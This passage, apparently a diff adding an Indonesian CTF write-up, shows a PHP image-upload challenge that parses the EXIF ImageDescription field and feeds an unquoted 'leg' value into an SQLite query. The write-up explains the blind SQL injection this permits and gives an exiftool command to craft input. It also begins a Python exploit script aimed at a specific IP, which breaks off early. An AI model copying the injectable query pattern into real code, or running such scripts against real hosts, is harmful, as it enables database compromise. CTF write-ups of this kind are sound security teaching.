+		&lt;span class=&quot;k&quot;&gt;die&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Token tidak valid!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+	&lt;span class=&quot;nv&quot;&gt;$_SESSION&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'csrf_token'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;base64_encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;openssl_random_pseudo_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+    
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$imageFileType&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;jpg&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$imageFileType&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;png&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$imageFileType&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;jpeg&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$imageFileType&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;gif&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+		&lt;span class=&quot;nv&quot;&gt;$upload_check&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$upload_check&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;move_uploaded_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_FILES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;legpic&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;tmp_name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$file_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+		&lt;span class=&quot;k&quot;&gt;die&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;gagal upload :(&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+	&lt;span class=&quot;nv&quot;&gt;$exif&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;exif_read_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;nb&quot;&gt;parse_str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$exif&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'ImageDescription'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$exif&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$exif&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;die&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Gambar tidak valid!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;nv&quot;&gt;$leg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;SQLite3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;escapeString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$exif&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'leg'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
+    
+    &lt;span class=&quot;nv&quot;&gt;$db&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;DELETE FROM Legs Where Session='&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_SESSION&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'session_token'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;';&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;INSERT INTO Legs (Session, Leg) VALUES ('&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_SESSION&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'session_token'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;', &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$leg&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;)&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;nb&quot;&gt;unlink&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    
+    &lt;span class=&quot;nv&quot;&gt;$dir&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;results/&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+	&lt;span class=&quot;nv&quot;&gt;$fname&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$dir&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;sha1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;openssl_random_pseudo_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+	&lt;span class=&quot;nv&quot;&gt;$f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;fopen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$fname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;w&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    
+    &lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$db&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;SELECT Leg FROM Legs Where Session='&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_SESSION&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'session_token'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;' Limit 1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+		&lt;span class=&quot;k&quot;&gt;foreach&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+			&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Leg'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'1'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+				&lt;span class=&quot;nb&quot;&gt;fwrite&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Satu kaki'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+			&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+			&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
+			&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Leg'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'2'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+				&lt;span class=&quot;nb&quot;&gt;fwrite&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Dua kaki'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+			&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+			&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+				&lt;span class=&quot;nb&quot;&gt;fwrite&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Tidak diketahui'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+			&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+	&lt;span class=&quot;nb&quot;&gt;fwrite&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;?php unlink(__FILE__); ?&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;nb&quot;&gt;fclose&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;nb&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Location: /&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$fname&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;nv&quot;&gt;$db&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;die&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;writeup&quot;&gt;Writeup&lt;/h3&gt;
+&lt;hr /&gt;
+&lt;p&gt;Diberikan website yang mempunya fitur untuk upload gambar dan membaca data melalui value dari exif ImageDescription, Jadi gambar yang kita upload akan di proses datanya ketika memiliki value pada “ImageDescription” dan value yang ada di dalamnya akan di passing ke fungsi &lt;code class=&quot;highlighter-rouge&quot;&gt;parse_str&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+	&lt;span class=&quot;nb&quot;&gt;parse_str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$exif&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'ImageDescription'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$exif&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$exif&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;die&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Gambar tidak valid!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;untuk menambahkan ImageDescription pada gambar kita bisa menggunakan exiftool &lt;code class=&quot;highlighter-rouge&quot;&gt;exiftool -ImageDescription=&quot;leg=1&quot; gambar.jpg&lt;/code&gt; sehingga ketika di upload akan mengembalikan response &lt;code class=&quot;highlighter-rouge&quot;&gt;Satu kaki&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+&lt;span class=&quot;nx&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;INSERT INTO Legs (Session, Leg) VALUES ('&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_SESSION&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'session_token'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;', &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$leg&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;)&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;pada kode di atas terlihat bahwa input yang kita masukkan dilempar kedalam query, sehingga kita dapat melakukan injeksi, namun terlihat ada filter yang di gunakan untuk mengescape inputan kita menggunakan &lt;code class=&quot;highlighter-rouge&quot;&gt;$leg = SQLite3::escapeString($exif['leg']);&lt;/code&gt; namun karena input kita tidak di wrap dengan quote di bagian query nya seperti &lt;code class=&quot;highlighter-rouge&quot;&gt;'{$leg}'&lt;/code&gt; jadi kita dapat melakukan injeksi tanpa menggunakan quote atau double, kemudian kita bisa mengkonstruksikan payload untuk melakukan blind sqlite injection.&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;re&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;StringIO&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;StringIO&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pycurl&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;os&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pickle&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;http://103.56.207.107:50001/upload.php&quot;&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&quot;Cache-Control&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;max-age=0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
+&lt;span class=&quot;s&quot;&gt;&quot;Origin&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;http://103.56.207.107:50001&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
+&lt;span class=&quot;s&quot;&gt;&quot;Upgrade-Insecure-Requests&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
+&lt;span class=&quot;s&quot;&gt;&quot;Content-Type&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;multipart/form-data&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
+&lt;span class=&quot;s&quot;&gt;&quot;User-Agent&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.75 Safari/537.36&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&quot;Accept&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
+&lt;span class=&quot;s&quot;&gt;&quot;Referer&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;http://103.56.207.107:50001/&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
+&lt;span class=&quot;s&quot;&gt;&quot;Accept-Language&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;en-US,en;q=0.9,de;q=0.8,es;q=0.7,id;q=0.6,ms;q=0.5&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
+&lt;span class=&quot;s&quot;&gt;&quot;Connection&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;close&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&quot;Cookie&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;PHPSESSID=5d42tgrbtj0lifr04f02k3r1e6&quot;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;check&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;re&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;search&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Satu kaki&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;getToken&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;req&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;greptoken&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;req&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://103.56.207.107:50001/&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
